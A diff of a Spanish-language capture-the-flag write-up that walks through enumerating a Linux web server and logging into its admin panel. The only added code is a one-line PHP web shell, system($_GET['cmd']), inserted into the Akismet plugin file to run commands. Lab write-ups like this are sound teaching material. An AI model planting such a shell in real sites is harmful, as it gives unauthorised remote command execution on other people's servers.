@@ -10,13 +10,13 @@ Tras comprobar que tenemos conectividad con la máquina procedemos a escanear lo
 
 En este primer escaneo podemos observar, por un lado que se trata de una máquina Linux (debido al TTL de 64) y por otro que tiene el servicio HTTP activo por el puerto 80.
 
-![Image](https://github.com/user-attachments/assets/de3d102c-2528-49f4-bd74-246f8e2491c9)
+![Image](https://github.com/user-attachments/assets/0f9b5813-7821-488d-bd43-d3365a7eb142)
 
 En este segundo escaneo obtenemos más información sobre este servicio, como la versión de Apache o la distribución de Linux (en este caso un Debian).
 
 Con la herramienta **WhatWeb** podemos identificar las tecnologías que está utilizando este servicio web, aunque en esta ocasión no nos sirve de mucha ayuda:
 
-![Image](https://github.com/user-attachments/assets/0f9b5813-7821-488d-bd43-d3365a7eb142)
+![Image](https://github.com/user-attachments/assets/2b16c429-5f50-4b51-a9eb-6842a77f410e)
 
 Un primer vistazo a la web nos confirma que esta URL no tiene nada de interés, puesto que se trata del clásico archivo index de apache:
 
@@ -104,6 +104,11 @@ Tras ejecutar el script descubrimos que la contraseña para el usuario es *love*
 ## Explotación
 
 Una vez hemos obtenido las credenciales nos autenticamos en el panel descubierto anteriormente y procedemos a buscar nuevas vulnerabilidades que nos permitan obtener acceso a la máquina. Para ello nos buscamos los plugins instalados y haciendo uso de uno llamado *Akismet* modificamos el código de su archivo *akismet.php* para que nos permita ejecutar comandos:
+
+```Php
+// Solamente incluiríamos esta linea de codigo
+system($_GET['cmd']);
+```
 
 ![Image](https://github.com/user-attachments/assets/70153d0b-4820-4e4b-83ab-68e4d623a68a)
 
